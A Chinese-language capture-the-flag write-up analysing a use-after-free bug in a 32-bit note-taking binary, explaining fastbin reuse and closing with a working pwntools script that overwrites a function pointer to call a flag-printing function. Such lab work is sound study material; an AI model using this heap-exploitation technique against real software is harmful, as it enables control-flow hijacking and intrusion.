# Level 3 Writeup

## Use after free复现与分析

### 技术点

- 

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230425185230936](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251852994.png)

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 开启了“堆栈金丝雀（stack canary）”技术，说明程序在栈上的缓冲区和控制数据（比如返回地址）之间会放置一个随机生成的小整数（称为canary或canary word）。当缓冲区溢出时，canary往往会第一个被破坏，因此使栈溢出攻击变得困难。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230425190105973](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251901004.png)

程序大意为一个笔记程序，具有"Add note"、"Delete note"、"Print note"、"Exit"四个选项。前三个选项分别对应一个实现了各自功能的函数。首先来看`add_note()`

![image-20230425190522773](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251905828.png)

该函数的功能是往一个数组`notelist`中添加笔记。当笔记少于5时，会先分配一个长度为8的内存块，然后再分配一个长度为用户输入的size的内存块，最后把用户输入的内容存入内存块中。其中put字段存储的是`print_note_content`函数的地址，content字段存储的是用户输入的笔记内容。若数组已满，则输出“Full”。

![image-20230425191608445](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251916493.png)

`print_note()`函数的功能是打印笔记内容。函数首先读取用户输入的位置，如果输入的位置超出了数组范围，就输出“Out of bound!”并退出程序。如果指定位置有笔记，就调用该笔记的put字段存储的函数，即`print_note_content`函数，来打印笔记的内容。

![image-20230425191821178](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251918197.png)

`del_note()`函数的功能是删除`notelist`数组中指定位置的笔记。函数首先读取用户输入的位置，如果输入的位置超出了数组范围，就输出“Out of bound!”并退出程序。如果指定位置有笔记，就先释放该笔记内容的内存，再释放该笔记所在的内存块。当释放掉笔记所在的内存块后，该内存块的指针仍然存在于`notelist`数组中，没有设置为NULL。如果后续调用`print_note()`，就可能会使用已经被释放掉的内存块，从而引发use after free的堆利用攻击。

另外，可执行文件中还存在着一个`magic()`函数，用来输出`flag`。

![image-20230425192117279](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251921296.png)

显然，本题的思路应该是想办法通过设置put字段为`magic`函数的地址，然后通过`print_note()`调用put指针所指的函数从而获得`flag`。

### 攻击复现

接下来实现攻击，首先要解决如何利用use after free原理修改put地址的值。因为笔记中content字段所分配的大小可以被用户所控制，因此考虑可以使用堆分配的Fast Bin机制。

Fast Bin是一种用于管理小尺寸（大小在0x20到0x80之间）的堆块的单向链表，它可以加快堆分配的速度。当一个堆块被释放时，它会被插入到对应尺寸的Fast Bin链表中，当有新的分配请求时，它会从链表中取出一个堆块返回给用户。这种分配采取 LIFO 策略，即优先最近释放的chunk。

结合本题的反汇编代码，产生如下攻击思路：

- 每次新建note都会分配两块堆内存
  - 一块`size==8`的内存用来存放put和content指针
  - 一块由用户控制大小的内存用来存放实际的content内容
- 如果新建两个note，即note0和note1，每次申请的用来存放content实际内容的内存都`size!=8`，那么内存布局如下图所示：
  ![image-20230425204843830](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304252048864.png)
- 然后再按照note0、note1的顺序删除两个note。这样对应尺寸`size==8`的Fast Bin链表末尾一定是刚刚分配的两个note用来存放指针的`size==8`的chunk，即`->note1->note0`的形式，如下图所示：
  ![image-20230425205151840](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304252051883.png)
- 此时再新建一个note，并且用户申请的用来存放实际content内容的内存大小设置为`size==8`那么此时分配到的两个内存如下
  ![image-20230425205244978](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304252052993.png)
  - 第一块`size==8`的用来存放put和content指针的内存会分配到note0中存放指针的地址
  - 第二块`size==8`的用来存放实际的content内容的内存会分配到note1中存放指针的地址，而这一部分是可以由用户任意输入的，因此可以给note1中put指针对应位置修改为`magic`函数的地址
- 这时调用`print_note()`函数打印note1的内容，函数会调用note1中put指针所指向的函数，而此时put指针已被修改为指向`magic`函数，因此`magic`函数将会被执行，从而获得了flag。

最终的payload如下：

```python
from pwn import *

def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

r = process('./use_after_free')
magic = 0x08048986
addnote(32, b"aaaa")
addnote(32, b"ddaa")
delnote(0)
delnote(1)
addnote(8, p32(magic))
printnote(0)
r.interactive()
```

运行payload脚本，可以成功得到flag。

![image-20230425205702169](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304252057220.png)